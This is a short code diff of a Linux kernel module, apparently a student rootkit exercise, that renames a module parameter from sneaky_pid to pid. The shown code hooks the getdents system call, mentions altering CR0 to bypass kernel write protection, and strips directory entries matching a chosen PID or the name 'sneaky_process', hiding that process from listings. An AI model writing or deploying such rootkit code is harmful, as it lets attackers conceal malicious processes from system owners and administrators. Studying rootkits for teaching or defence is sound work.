@@ -17,9 +17,8 @@ struct linux_dirent {
   char d_name[];
 };
 
-MODULE_LICENSE("GPL");
-static char * sneaky_pid = "";
-module_param(sneaky_pid, charp, 0);
+static char *pid = "";
+module_param(pid, charp, 0);
 MODULE_PARM_DESC(pid, "sneaky_pid");
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
@@ -71,7 +70,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
   
   for(bpos = 0;bpos<nread;){
     d = (struct linux_dirent *) ((char*)dirp + bpos);
-    if ((strcmp(d->d_name, sneaky_pid) == 0) || (strcmp(d->d_name, "sneaky_process") == 0)) {
+    if ((strcmp(d->d_name, pid) == 0) || (strcmp(d->d_name, "sneaky_process") == 0)) {
       memmove((char*)dirp + bpos, (char*)dirp + bpos + d->d_reclen, nread - bpos - d->d_reclen);
       nread -= d->d_reclen;
     }
